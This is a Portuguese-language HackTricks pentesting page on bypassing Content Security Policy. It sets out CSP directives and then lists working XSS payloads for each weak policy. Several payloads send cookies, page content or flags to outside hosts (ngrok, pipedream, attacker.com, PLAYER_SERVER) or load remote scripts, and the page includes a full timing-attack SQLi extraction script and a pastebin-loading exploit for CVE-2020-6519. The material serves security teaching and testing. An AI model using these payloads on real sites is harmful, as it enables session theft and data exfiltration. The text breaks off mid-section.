# Bypass de Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais sobre bugs web3

üîî Receba notifica√ß√µes sobre novos programas de recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## O que √© CSP

Pol√≠tica de Seguran√ßa de Conte√∫do ou CSP √© uma tecnologia integrada ao navegador que **ajuda a proteger contra ataques como cross-site scripting (XSS)**. Ela lista e descreve caminhos e fontes, a partir das quais o navegador pode carregar recursos com seguran√ßa. Os recursos podem incluir imagens, frames, javascript e mais. Aqui est√° um exemplo de recursos permitidos do dom√≠nio local (self) para serem carregados e executados em linha e permitir fun√ß√µes de execu√ß√£o de c√≥digo de string como `eval`, `setTimeout` ou `setInterval:`

A Pol√≠tica de Seguran√ßa de Conte√∫do √© implementada via **cabe√ßalhos de resposta** ou **elementos meta da p√°gina HTML**. O navegador segue a pol√≠tica recebida e bloqueia ativamente viola√ß√µes √† medida que s√£o detectadas.

Implementado via cabe√ßalho de resposta:
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
Implementado via meta tag:
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Cabe√ßalhos

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` Este n√£o bloquear√° nada, apenas enviar√° relat√≥rios (usado em ambiente de pr√©-produ√ß√£o).

## Definindo recursos

CSP funciona restringindo as origens de onde o conte√∫do ativo e passivo pode ser carregado. Ele tamb√©m pode restringir certos aspectos do conte√∫do ativo, como a execu√ß√£o de javascript inline e o uso de `eval()`.
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Diretivas

* **script-src**: Esta diretiva especifica as fontes permitidas para JavaScript. Isso inclui n√£o apenas URLs carregados diretamente em elementos, mas tamb√©m coisas como manipuladores de eventos de script inline (onclick) e folhas de estilo XSLT que podem acionar a execu√ß√£o de script.
* **default-src**: Esta diretiva define a pol√≠tica para buscar recursos por padr√£o. Quando as diretivas de busca est√£o ausentes no cabe√ßalho CSP, o navegador segue esta diretiva por padr√£o.
* **Child-src**: Esta diretiva define os recursos permitidos para trabalhadores da web e conte√∫do de quadros incorporados.
* **connect-src**: Esta diretiva restringe URLs para carregar usando interfaces como fetch, websocket, XMLHttpRequest
* **frame-src**: Esta diretiva restringe URLs para quadros que podem ser chamados.
* **frame-ancestors**: Esta diretiva especifica as fontes que podem incorporar a p√°gina atual. Esta diretiva se aplica a [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed), ou [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet). Esta diretiva n√£o pode ser usada em tags e se aplica apenas a recursos n√£o HTML.
* **img-src**: Define as fontes permitidas para carregar imagens na p√°gina da web.
* **font-src:** A diretiva especifica fontes v√°lidas para fontes carregadas usando `@font-face`.
* **manifest-src**: Esta diretiva define as fontes permitidas de arquivos de manifesto de aplicativo.
* **media-src**: Define as fontes permitidas de onde objetos de m√≠dia podem ser carregados.
* **object-src**: Define as fontes permitidas para os elementos \<object>, \<embed> e \<applet>.
* **base-uri**: Define as URLs permitidas que podem ser carregadas usando um elemento.
* **form-action**: Esta diretiva lista os pontos finais v√°lidos para envio de tags.
* **plugin-types**: Define limites nos tipos de mime que uma p√°gina pode invocar.
* **upgrade-insecure-requests**: Esta diretiva instrui os navegadores a reescrever os esquemas de URL, mudando HTTP para HTTPS. Esta diretiva pode ser √∫til para sites com um grande n√∫mero de URLs antigas que precisam ser reescritas.
* **sandbox**: A diretiva sandbox permite um sandbox para o recurso solicitado, semelhante ao atributo sandbox. Ele aplica restri√ß√µes √†s a√ß√µes de uma p√°gina, incluindo a preven√ß√£o de pop-ups, a preven√ß√£o da execu√ß√£o de plug-ins e scripts e a aplica√ß√£o de uma pol√≠tica de mesma origem.

### **Fontes**

* \*: Isso permite qualquer URL, exceto os esquemas `data:`, `blob:` e `filesystem:`
* **self**: Esta fonte define que o carregamento de recursos na p√°gina √© permitido a partir do mesmo dom√≠nio.
* **data**: Esta fonte permite o carregamento de recursos via o esquema de dados (por exemplo, imagens codificadas em Base64)
* **none**: Esta diretiva n√£o permite que nada seja carregado de qualquer fonte.
* **unsafe-eval**: Isso permite o uso de eval() e m√©todos semelhantes para criar c√≥digo a partir de strings. Esta n√£o √© uma pr√°tica segura para incluir esta fonte em qualquer diretiva. Por esse motivo, √© chamado de inseguro.
* **unsafe-hashes**: Isso permite a ativa√ß√£o de manipuladores de eventos inline espec√≠ficos.
* **unsafe-inline**: Isso permite o uso de recursos inline, como elementos inline, URLs javascript:, manipuladores de eventos inline e elementos inline. Novamente, isso n√£o √© recomendado por motivos de seguran√ßa.
* **nonce**: Uma lista branca para scripts inline espec√≠ficos usando um nonce criptogr√°fico (n√∫mero usado uma vez). O servidor deve gerar um valor de nonce exclusivo cada vez que transmite uma pol√≠tica.
* **sha256-\<hash>**: Lista branca de scripts com um hash sha256 espec√≠fico
* **strict-dynamic**: Permite que o navegador carregue e execute novas tags JavaScript no DOM de qualquer fonte de script que tenha sido previamente listada por um valor "nonce" ou "hash".
* **host**: Indica um host como example.com

## Regras CSP inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Carga √∫til funcional: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Carga de trabalho funcional:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Se voc√™ de alguma forma conseguir fazer com que um **c√≥digo JS permitido crie uma nova tag de script** no DOM com o seu c√≥digo JS, porque um script permitido est√° criando-o, a **nova tag de script ser√° permitida a ser executada**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Carga de trabalho funcional:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Falta de object-src e default-src

{% hint style="danger" %}
**Parece que isso n√£o est√° mais funcionando**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Cargas de trabalho funcionais:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Upload de Arquivo + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Se voc√™ pode fazer upload de um arquivo JS, voc√™ pode contornar essa CSP:

Payload de trabalho:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
No entanto, √© altamente prov√°vel que o servidor esteja **validando o arquivo enviado** e s√≥ permitir√° que voc√™ **envie um tipo espec√≠fico de arquivo**.

Al√©m disso, mesmo que voc√™ possa enviar um **c√≥digo JS dentro** de um arquivo usando uma extens√£o aceita pelo servidor (como: _script.png_), isso n√£o ser√° suficiente porque alguns servidores como o servidor Apache **selecionam o tipo MIME do arquivo com base na extens√£o** e navegadores como o Chrome **rejeitar√£o a execu√ß√£o de c√≥digo Javascript** dentro de algo que deveria ser uma imagem. "Felizmente", existem erros. Por exemplo, a partir de um CTF, aprendi que o **Apache n√£o reconhece** a extens√£o _**.wave**_, portanto, n√£o a serve com um **tipo MIME como √°udio/\***.

A partir daqui, se voc√™ encontrar um XSS e um upload de arquivo e conseguir encontrar uma **extens√£o mal interpretada**, poder√° tentar enviar um arquivo com essa extens√£o e o conte√∫do do script. Ou, se o servidor estiver verificando o formato correto do arquivo enviado, crie um poliglota ([alguns exemplos de poliglotas aqui](https://github.com/Polydet/polyglot-database)).

### Endpoints de terceiros + ('unsafe-eval')

{% hint style="warning" %}
Para alguns dos payloads a seguir, **`unsafe-eval` nem √© necess√°rio**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Carregue uma vers√£o vulner√°vel do Angular e execute JS arbitr√°rio:
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads usando Angular + uma biblioteca com fun√ß√µes que retornam o objeto `window` ([confira este post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
O post mostra que voc√™ pode **carregar** todas as **bibliotecas** do `cdn.cloudflare.com` (ou qualquer outro reposit√≥rio de bibliotecas JS permitido), executar todas as fun√ß√µes adicionadas de cada biblioteca e verificar **quais fun√ß√µes de quais bibliotecas retornam o objeto `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
### Endpoints de Terceiros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Cen√°rios como este, em que `script-src` √© definido como `self` e um dom√≠nio espec√≠fico que est√° na lista branca pode ser contornado usando JSONP. Os pontos de extremidade JSONP permitem m√©todos de retorno de chamada inseguros que permitem que um invasor execute XSS, carga √∫til de trabalho:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
O **JSONBee** cont√©m pontos finais JSONP prontos para uso para a CSP bypass de diferentes sites.

A mesma vulnerabilidade ocorrer√° se o **ponto final confi√°vel contiver um redirecionamento aberto** porque, se o ponto final inicial for confi√°vel, os redirecionamentos ser√£o confi√°veis.

### Bypass de caminho de pasta

Se a pol√≠tica CSP apontar para uma pasta e voc√™ usar **%2f** para codificar **"/"**, ainda ser√° considerado dentro da pasta. Todos os navegadores parecem concordar com isso.\
Isso leva a uma poss√≠vel bypass, usando "**%2f..%2f**" se o servidor decodific√°-lo. Por exemplo, se o CSP permitir `http://example.com/company/`, voc√™ pode ignorar a restri√ß√£o da pasta e executar: `http://example.com/company%2f..%2fattacker/file.js`

Exemplo online: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Execu√ß√£o de JS em iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### **base-uri** ausente

Se a diretiva **base-uri** estiver ausente, voc√™ pode abusar dela para realizar uma [**inje√ß√£o de marca√ß√£o pendente**](../dangling-markup-html-scriptless-injection.md).

Al√©m disso, se a **p√°gina estiver carregando um script usando um caminho relativo** (como `/js/app.js`) usando um **Nonce**, voc√™ pode abusar da **tag** **base** para fazer com que ele **carregue** o script do **seu pr√≥prio servidor, alcan√ßando um XSS.**\
Se a p√°gina vulner√°vel for carregada com **httpS**, use um URL httpS na base.
```html
<base href="https://www.attacker.com/">
```
### Eventos do AngularJS

Dependendo da pol√≠tica espec√≠fica, o CSP bloquear√° eventos JavaScript. No entanto, o AngularJS define seus pr√≥prios eventos que podem ser usados em vez disso. Quando dentro de um evento, o AngularJS define um objeto `$event` especial, que simplesmente faz refer√™ncia ao objeto de evento do navegador. Voc√™ pode usar esse objeto para realizar uma viola√ß√£o do CSP. No Chrome, h√° uma propriedade especial no objeto `$event/event` chamada `path`. Essa propriedade cont√©m uma matriz de objetos que faz com que o evento seja executado. A √∫ltima propriedade √© sempre o objeto `window`, que podemos usar para realizar uma fuga de sandbox. Passando essa matriz para o filtro `orderBy`, podemos enumerar a matriz e usar o √∫ltimo elemento (o objeto `window`) para executar uma fun√ß√£o global, como `alert()`. O seguinte c√≥digo demonstra isso:
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
### AngularJS e dom√≠nio na lista branca

Se o AngularJS estiver sendo usado em um site que usa uma pol√≠tica de seguran√ßa de conte√∫do (CSP) para permitir apenas scripts de um dom√≠nio espec√≠fico, √© poss√≠vel explorar uma vulnerabilidade de vazamento de informa√ß√µes para contornar a pol√≠tica de seguran√ßa.

Para fazer isso, o invasor pode injetar um script malicioso que vaza informa√ß√µes confidenciais do site para um dom√≠nio controlado pelo invasor. O script malicioso pode ser injetado em um elemento AngularJS que √© permitido pela pol√≠tica de seguran√ßa, como um atributo ng-src ou ng-href.

Para explorar essa vulnerabilidade, o invasor precisa encontrar um elemento AngularJS que permita a inje√ß√£o de c√≥digo e que tamb√©m permita a inclus√£o de um dom√≠nio controlado pelo invasor.
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Se a aplica√ß√£o estiver usando o angular JS e os scripts forem carregados de um dom√≠nio na lista branca, √© poss√≠vel contornar essa pol√≠tica CSP chamando fun√ß√µes de retorno de chamada e classes vulner√°veis. Para mais detalhes, visite este incr√≠vel [reposit√≥rio](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) do git.

Cargas de trabalho funcionais:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Outros pontos de execu√ß√£o arbitr√°rios JSONP podem ser encontrados [**aqui**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (alguns deles foram exclu√≠dos ou corrigidos)

### Bypass CSP com marca√ß√£o pendente

Leia [como aqui](../dangling-markup-html-scriptless-injection.md).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` significa que voc√™ pode executar qualquer script dentro do c√≥digo (XSS pode executar c√≥digo) e `img-src *` significa que voc√™ pode usar na p√°gina qualquer imagem de qualquer recurso.

Voc√™ pode contornar esse CSP exfiltrando os dados por meio de imagens (nesta ocasi√£o, o XSS abusa de um CSRF onde uma p√°gina acess√≠vel pelo bot cont√©m um SQLi e extrai a bandeira por meio de uma imagem):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Voc√™ tamb√©m pode abusar dessa configura√ß√£o para **carregar c√≥digo javascript inserido dentro de uma imagem**. Se, por exemplo, a p√°gina permitir o carregamento de imagens do Twitter, voc√™ pode **criar** uma **imagem especial**, **carreg√°-la** no Twitter e abusar do "**unsafe-inline**" para **executar** um c√≥digo JS (como um XSS regular) que ir√° **carregar** a **imagem**, **extrair** o **JS** dela e **execut√°-lo**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Com Service Workers

A fun√ß√£o **`importScripts`** dos service workers n√£o √© limitada pelo CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Inje√ß√£o de Pol√≠tica

**Pesquisa:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Se um **par√¢metro** enviado por voc√™ est√° sendo **colado dentro** da **declara√ß√£o** da **pol√≠tica**, ent√£o voc√™ pode **alterar** a **pol√≠tica** de alguma forma que a torne **in√∫til**. Voc√™ pode **permitir o script 'unsafe-inline'** com qualquer um desses bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Porque essa diretiva ir√° **sobrescrever diretivas script-src existentes**.\
Voc√™ pode encontrar um exemplo aqui: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

No Edge √© muito mais simples. Se voc√™ puder adicionar no CSP apenas isso: **`;_`** o **Edge** ir√° **descartar** toda a **pol√≠tica**.\
Exemplo: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Ataque de tempo

Observe a falta da diretiva `'unsafe-inline'`\
Desta vez, voc√™ pode fazer a v√≠tima **carregar** uma p√°gina em **seu controle** via **XSS** com um `<iframe>`. Desta vez, voc√™ vai fazer a v√≠tima acessar a p√°gina de onde deseja extrair informa√ß√µes (**CSRF**). Voc√™ n√£o pode acessar o conte√∫do da p√°gina, mas se de alguma forma voc√™ puder **controlar o tempo que a p√°gina precisa para carregar**, poder√° extrair as informa√ß√µes de que precisa.

Desta vez, uma **flag** ser√° extra√≠da, sempre que um **caractere for adivinhado corretamente** via SQLi, a **resposta** leva **mais tempo** devido √† fun√ß√£o de espera. Ent√£o, voc√™ poder√° extrair a flag:
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### Via Bookmarklets

Este ataque implicaria alguma engenharia social onde o atacante **convence o usu√°rio a arrastar e soltar um link sobre o bookmarklet do navegador**. Este bookmarklet conteria **c√≥digo javascript malicioso** que, quando arrastado e solto ou clicado, seria executado no contexto da janela web atual, **burlando o CSP e permitindo roubar informa√ß√µes sens√≠veis** como cookies ou tokens.

Para mais informa√ß√µes [**verifique o relat√≥rio original aqui**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### Vazamento de Informa√ß√µes CSP + Iframe

Imagine uma situa√ß√£o em que uma **p√°gina est√° redirecionando** para uma **p√°gina diferente com um segredo dependendo** do **usu√°rio**. Por exemplo, o usu√°rio **admin** acessando **redirectme.domain1.com** √© redirecionado para **adminsecret321.domain2.com** e voc√™ pode causar um XSS no admin.\
**Al√©m disso, as p√°ginas redirecionadas n√£o s√£o permitidas pela pol√≠tica de seguran√ßa, mas a p√°gina que redireciona √©.**

Voc√™ pode vazar o dom√≠nio para onde o admin √© redirecionado atrav√©s de:

* **viola√ß√£o de CSP**
* **regras de CSP.**

A viola√ß√£o de CSP √© um vazamento instant√¢neo. Tudo o que precisa ser feito √© carregar um iframe apontando para `https://redirectme.domain1.com` e ouvir o evento `securitypolicyviolation` que cont√©m a propriedade `blockedURI` contendo o dom√≠nio do URI bloqueado. Isso ocorre porque o `https://redirectme.domain1.com` (permitido pelo CSP) redireciona para `https://adminsecret321.domain2.com` (**bloqueado pelo CSP**). Isso faz uso de um comportamento indefinido de como lidar com iframes com CSP. Chrome e Firefox se comportam de maneira diferente em rela√ß√£o a isso.

Quando voc√™ conhece os caracteres que podem compor o subdom√≠nio secreto, tamb√©m pode usar uma pesquisa bin√°ria e verificar quando o CSP bloqueou o recurso e quando n√£o criando diferentes dom√≠nios proibidos no CSP (neste caso, o segredo pode estar na forma doc-X-XXXX.secdrivencontent.dev)
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Truque de [**aqui**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

üêû Leia tutoriais de bugs web3

üîî Receba notifica√ß√µes sobre novas recompensas por bugs

üí¨ Participe de discuss√µes na comunidade

## Tecnologias Inseguras para Bypass CSP

### Sobrecarga de buffer de resposta PHP

O PHP √© conhecido por **armazenar em buffer a resposta em 4096** bytes por padr√£o. Portanto, se o PHP estiver mostrando um aviso, fornecendo **dados suficientes dentro dos avisos**, a **resposta** ser√° **enviada antes** do **cabe√ßalho CSP**, fazendo com que o cabe√ßalho seja ignorado.\
Ent√£o, a t√©cnica consiste basicamente em **preencher o buffer de resposta com avisos** para que o cabe√ßalho CSP n√£o seja enviado.

Idea de [**este writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Reescrever a p√°gina de erro

De [**este writeup**](https://blog.ssrf.kr/69) parece que foi poss√≠vel contornar uma prote√ß√£o CSP carregando uma p√°gina de erro (potencialmente sem CSP) e reescrevendo seu conte√∫do.
```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```
### SOME + 'self' + wordpress

SOME √© uma t√©cnica que abusa de um XSS (ou XSS altamente limitado) **em um endpoint de uma p√°gina** para **abusar** de **outros endpoints da mesma origem**. Isso √© feito carregando o endpoint vulner√°vel de uma p√°gina do atacante e, em seguida, atualizando a p√°gina do atacante para o endpoint real na mesma origem que voc√™ deseja abusar. Dessa forma, o **endpoint vulner√°vel** pode usar o objeto **`opener`** na **carga √∫til** para **acessar o DOM** do **endpoint real a ser abusado**. Para mais informa√ß√µes, verifique:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

Al√©m disso, o **wordpress** tem um endpoint **JSONP** em `/wp-json/wp/v2/users/1?_jsonp=data` que ir√° **refletir** os **dados** enviados na sa√≠da (com a limita√ß√£o de apenas letras, n√∫meros e pontos).

Um atacante pode abusar desse endpoint para **gerar um ataque SOME** contra o WordPress e **incorpor√°-lo** dentro de `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` note que este **script** ser√° **carregado** porque √© **permitido por 'self'**. Al√©m disso, e porque o WordPress est√° instalado, um atacante pode abusar do **ataque SOME** atrav√©s do **endpoint de retorno de chamada vulner√°vel** que **burla o CSP** para dar mais privil√©gios a um usu√°rio, instalar um novo plugin...\
Para mais informa√ß√µes sobre como realizar este ataque, verifique [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## Bypasses de Exfiltra√ß√£o CSP

Se houver um CSP estrito que n√£o permita que voc√™ **interaja com servidores externos**, h√° algumas coisas que voc√™ sempre pode fazer para exfiltrar as informa√ß√µes.

### Location

Voc√™ pode simplesmente atualizar a localiza√ß√£o para enviar ao servidor do atacante as informa√ß√µes secretas:
```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```
### Meta tag

Voc√™ pode redirecionar injetando uma meta tag (isso √© apenas um redirecionamento, isso n√£o vazar√° conte√∫do)
```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```
### DNS Prefetch

Para carregar p√°ginas mais rapidamente, os navegadores pr√©-resolvem os nomes de host em endere√ßos IP e os armazenam em cache para uso posterior.\
